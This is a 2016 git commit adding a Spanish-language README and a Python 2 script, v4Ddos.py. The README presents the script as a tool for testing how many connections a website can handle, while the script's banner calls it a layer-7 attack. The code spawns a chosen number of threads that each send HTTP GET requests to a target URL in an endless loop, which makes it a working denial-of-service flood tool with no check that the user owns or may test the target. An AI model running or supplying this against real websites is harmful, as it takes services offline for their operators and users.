a1a4f845e9d5be587e96f4246c1af1e1b5218f45
v4char <v4char@gmail.com>
2016-02-11 16:54:17 +0100

    Primera versión 11-2-2016

---
+++ README.md
@@ -0,0 +1,11 @@
+#       _  _   ____      _           
+#__   _| || | |  _ \  __| | ___  ___ 
+#\ \ / / || |_| | | |/ _` |/ _ \/ __|
+# \ V /|__   _| |_| | (_| | (_) \__ \
+#  \_/    |_| |____/ \__,_|\___/|___/
+#                                    
+#
+
+v4Ddos.py es un script que permite probar el número de conexiones que puede soportar una web.
+
+La manera de usarlo es muy sencilla solo necesitas introducir 2 parametros el primero la url de la web y el segundo el número de conexiones simultaneas que quieres realizar, este script funciona en cualquier sistema operativo.
---
+++ v4Ddos.py
@@ -0,0 +1,68 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# Autor: v4char
+# Email: v4char@gmail.com
+# Date:  11-2-2016
+
+import threading
+import sys
+import requests
+import time
+
+print '       _  _   ____      _           '
+print '__   _| || | |  _ \  __| | ___  ___ '
+print '\ \ / / || |_| | | |/ _` |/ _ \/ __|'
+print ' \ V /|__   _| |_| | (_| | (_) \__ \\'
+print '  \_/    |_| |____/ \__,_|\___/|___/'
+print '                                    '
+
+print '\nv4Ddos.py Script creado por v4char, ataque a la capa 7 protocolo TCP'
+
+if len(sys.argv) >= 3:
+
+   url = sys.argv[1]
+   hilos = int(sys.argv[2])
+   activo = 1
+   estado = '+'
+
+   def conectar():
+      global url
+      global activo
+      global estado
+
+      while activo:
+         if activo == 0:
+            raise
+            break
+         else:
+            try:
+               requests.get(url,timeout=8)
+               estado = '+'
+            except KeyboardInterrupt:
+               activo = 0
+            except:
+               estado = '-'
+
+   def principal():
+      global hilos
+
+      threads = list()
+      for i in range(hilos):
+         conexion = threading.Thread(target=conectar)
+         threads.append(conexion)
+         conexion.start()
+
+   print "\nCreando conexiones...\n"
+   principal()
+   while activo:
+      try:
+         sys.stdout.write(estado+" ")
+         sys.stdout.flush()
+         time.sleep(1)
+      except KeyboardInterrupt:
+         activo = 0
+         print '\n\nCerrando conexiones...'
+      except:
+         1
+else:
+   print "\nUsa 'python v4Ddos.py http://web/patch número de conexiones simultaneas'"
